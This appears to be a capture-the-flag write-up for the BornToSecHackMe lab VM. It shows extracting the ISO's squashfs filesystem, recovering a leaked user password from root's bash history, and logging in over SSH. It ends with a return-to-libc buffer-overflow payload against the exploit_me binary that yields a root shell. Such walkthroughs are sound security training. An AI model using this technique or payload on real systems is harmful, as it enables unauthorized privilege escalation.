@@ -1,0 +1,143 @@
+# Abstract
+
+```console
+kali@kali:~$ 7z x BornToSecHackMe-v1.1.iso
+[...]
+kali@kali:~$ cd casper
+kali@kali:casper$ ls
+README.diskdefines   filesystem.manifest-desktop  filesystem.squashfs  vmlinuz
+filesystem.manifest  filesystem.size
+kali@kali:casper$ unsquashfs filesystem.squashfs
+[...]
+kali@kali:casper$ cd squashfs-root
+kali@kali:squashfs-root$ ls
+bin   dev  home        lib    mnt  proc  run   selinux  sys  usr  vmlinuz
+boot  etc  initrd.img  media  opt  root  sbin  srv      tmp  var
+kali@kali:squashfs-root$ cd root/
+kali@kali:root$ ls -la .bash_history
+kali@kali:root$ cat .bash_history
+[...]
+adduser zaz
+646da671ca01bb5d84dbb5fb2238dc8e
+[...]
+kali@kali:root$ ssh zaz@192.168.178.62
+[...]
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print("A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
+# whoami
+root
+````
+
+***
+
+# Extracting the ISO files
+
+Once we have downloaded the ISO, we can extract the fileystem with 7zip. [[001]](https://www.tecmint.com/extract-files-from-iso-files-linux/)
+
+```console
+kali@kali:~$ 7z x BornToSecHackMe-v1.1.iso
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs AMD Ryzen 7 3700X 8-Core Processor
+    (870F10),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 427819008 bytes (408 MiB)
+Extracting archive: BornToSecHackMe-v1.1.iso
+--
+Path = BornToSecHackMe-v1.1.iso
+Type = Iso
+Physical Size = 427819008
+Created = 2017-06-16 23:39:33
+Modified = 2017-06-16 23:39:33
+
+Everything is Ok
+
+Folders: 5
+Files: 22
+Size:       426814610
+Compressed: 427819008
+```
+
+This leaves us with the files of the ISO.
+
+# Uncompressing the filesystem
+
+With the extracted ISO files, we can now see the compressed filesystem.
+
+```console
+kali@kali:casper$ ls
+README.diskdefines   filesystem.manifest-desktop  filesystem.squashfs  vmlinuz
+filesystem.manifest  filesystem.size
+```
+
+Thankfully we can easily uncompress it with `unsquashfs`. [[002]](https://manpages.debian.org/testing/squashfs-tools/unsquashfs.1.en.html)
+
+```console
+kali@kali:casper$ unsquashfs filesystem.squashfs
+Parallel unsquashfs: Using 16 processors
+61188 inodes (56421 blocks) to write
+
+
+create_inode: could not create character device squashfs-root/dev/urandom, because you're not superuser!
+[=======================================================================================-          ] 50945/56421  90%
+create_inode: socket squashfs-root/var/spool/postfix/dev/log ignored
+
+create_inode: socket squashfs-root/var/spool/postfix/private/anvil ignored
+
+create_inode: socket squashfs-root/var/spool/postfix/private/bounce ignored
+
+[...]
+
+create_inode: socket squashfs-root/var/spool/postfix/public/showq ignored
+[================================================================================================\ ] 56391/56421  99%
+created 54391 files
+created 8445 directories
+created 6743 symlinks
+created 0 devices
+created 2 fifos
+```
+
+Now we have a directory called `squashfs-root`, which contains the filesystem of the ISO.
+
+# Finding the vulnerability
+
+As we look around the filesystem we find a directory called `root` in `/`, which contains the `.bash_history` of _root_. 
+
+```console
+kali@kali:squashfs-root$ ls
+bin   dev  home        lib    mnt  proc  run   selinux  sys  usr  vmlinuz
+boot  etc  initrd.img  media  opt  root  sbin  srv      tmp  var
+kali@kali:squashfs-root$ cd root/
+kali@kali:root$ ls -la .bash_history
+-rw------- 1 henne henne 20932 Oct 15  2015 .bash_history
+```
+
+Let's check out what the root user was up to! 
+
+```console
+kali@kali:root$ cat .bash_history
+[...]
+adduser zaz
+646da671ca01bb5d84dbb5fb2238dc8e
+[...]
+```
+
+Looks like someone accidentally entered the password for _zaz_ twice. Now we can log into _zaz_ and exploit the binary there.
+
+```console
+kali@kali:root$ ssh zaz@192.168.178.62
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+zaz@192.168.178.62's password:
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print("A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
+# whoami
+root
+```
